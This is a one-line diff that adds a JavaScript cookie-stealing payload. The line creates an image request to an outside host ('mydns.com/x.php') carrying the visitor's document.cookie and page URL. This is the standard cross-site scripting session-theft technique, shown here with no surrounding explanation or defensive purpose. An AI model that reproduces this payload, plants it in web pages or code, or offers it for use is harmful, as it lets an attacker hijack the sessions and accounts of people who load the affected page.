@@ -1,0 +1,1 @@
+(new Image()).src = 'http://mydns.com/x.php?c=' + escape(document.cookie) + "    URL=" + escape(document.URL);
